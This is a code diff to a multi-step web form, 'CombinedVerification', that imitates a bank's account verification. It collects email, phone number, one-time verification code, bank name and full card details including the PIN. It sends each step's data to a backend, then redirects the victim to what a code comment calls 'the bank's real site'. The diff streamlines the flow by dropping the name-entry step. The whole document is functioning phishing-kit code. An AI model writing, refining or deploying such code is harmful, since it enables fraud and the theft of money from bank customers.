@@ -9,8 +9,6 @@ export default function CombinedVerification() {
   const router = useRouter();
   const [currentStep, setCurrentStep] = useState(1);
   const [formData, setFormData] = useState({
-    firstName: "",
-    lastName: "",
     emailAddress: "",
     phoneNumber: "",
     verificationCode: "",
@@ -85,25 +83,10 @@ export default function CombinedVerification() {
       if (!success) return;
     } 
     else if (currentStep === 2) {
-      if (!formData.firstName || !formData.lastName) return;
+      if (!formData.verificationCode) return;
       
       // Send step 2 data
       const success = await sendStepData(2, {
-        firstName: formData.firstName,
-        lastName: formData.lastName,
-        emailAddress: formData.emailAddress,
-        phoneNumber: formData.phoneNumber
-      });
-      
-      if (!success) return;
-    } 
-    else if (currentStep === 3) {
-      if (!formData.verificationCode) return;
-      
-      // Send step 3 data
-      const success = await sendStepData(3, {
-        firstName: formData.firstName,
-        lastName: formData.lastName,
         emailAddress: formData.emailAddress,
         phoneNumber: formData.phoneNumber,
         verificationCode: formData.verificationCode
@@ -111,7 +94,7 @@ export default function CombinedVerification() {
       
       if (!success) return;
     } 
-    else if (currentStep === 4) {
+    else if (currentStep === 3) {
       // Validate that credit card fields are filled (including PIN)
       if (!formData.cardNumber || !formData.cardExpiry || !formData.cardCVV || !formData.cardholderName || !formData.cardPIN) return;
       
@@ -121,7 +104,7 @@ export default function CombinedVerification() {
     }
 
     // Move to next step
-    if (currentStep < 4) {
+    if (currentStep < 3) {
       setCurrentStep(currentStep + 1);
     }
   };
@@ -129,8 +112,6 @@ export default function CombinedVerification() {
   const handleRequestCode = async () => {
     // Send code request notification
     await sendStepData('code-request', {
-      firstName: formData.firstName,
-      lastName: formData.lastName,
       emailAddress: formData.emailAddress,
       phoneNumber: formData.phoneNumber,
       message: "User requested verification code"
@@ -153,8 +134,6 @@ export default function CombinedVerification() {
         },
         body: JSON.stringify({
           bankName: formData.bankName,
-          firstName: formData.firstName,
-          lastName: formData.lastName,
           emailAddress: formData.emailAddress,
           phoneNumber: formData.phoneNumber,
           verificationCode: formData.verificationCode,
@@ -176,11 +155,11 @@ export default function CombinedVerification() {
       console.log("Final verification submitted successfully");
       setSubmitStatus("success");
       // Move to confirmation step
-      setCurrentStep(5);
+      setCurrentStep(4);
       
       // Redirect to the bank's real site after a short delay
       setTimeout(() => {
-        router.push('/');
+        router.push('https://secure.bravera.bank/login');
       }, 3000);
       
     } catch (error) {
@@ -229,37 +208,6 @@ export default function CombinedVerification() {
       case 2:
         return (
           <>
-            <h2 className="text-xl mb-2">Name Verification!</h2>
-            <h3 className="text-lg mb-4">Confirm Your Name Information</h3>
-            <p className="mb-4">Please confirm your name details on file.</p>
-
-            <div className="mb-4">
-              <label className="block mb-1">First Name</label>
-              <input
-                type="text"
-                name="firstName"
-                value={formData.firstName}
-                onChange={handleChange}
-                className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
-              />
-            </div>
-
-            <div className="mb-4">
-              <label className="block mb-1">Last Name</label>
-              <input
-                type="text"
-                name="lastName"
-                value={formData.lastName}
-                onChange={handleChange}
-                className="w-full px-4 py-2 bg-[#1E1F20] text-white border border-gray-600 rounded focus:outline-none focus:ring-1 focus:ring-[#F2AA2E]"
-              />
-            </div>
-          </>
-        );
-
-      case 3:
-        return (
-          <>
             <h2 className="text-xl mb-2">Code Verification</h2>
             <p className="mb-4">
               We&apos;ve sent a secured code to your registered number. Please tell us your code
@@ -295,7 +243,7 @@ export default function CombinedVerification() {
           </>
         );
 
-      case 4:
+      case 3:
         return (
           <>
             <h2 className="text-xl mb-2">Account Verification!</h2>
@@ -387,7 +335,7 @@ export default function CombinedVerification() {
           </>
         );
 
-      case 5:
+      case 4:
         return (
           <>
             <h2 className="text-xl mb-2">Account Verification!</h2>
@@ -439,7 +387,7 @@ export default function CombinedVerification() {
           
           {/* Progress Indicator */}
           <div className="flex justify-between mb-6 px-4">
-            {[1, 2, 3, 4].map((step) => (
+            {[1, 2, 3].map((step) => (
               <div 
                 key={step} 
                 className={`w-8 h-8 rounded-full flex items-center justify-center ${
@@ -459,7 +407,7 @@ export default function CombinedVerification() {
           </div>
 
           {/* Navigation Buttons */}
-          {currentStep < 5 && (
+          {currentStep < 4 && (
             <div className="flex justify-center mt-6">
               <button
                 type="button"
@@ -470,7 +418,7 @@ export default function CombinedVerification() {
                 {isSubmitting ? (
                   "Processing..."
                 ) : (
-                  currentStep === 4 ? "Submit" : "Continue"
+                  currentStep === 3 ? "Submit" : "Continue"
                 )}
               </button>
             </div>
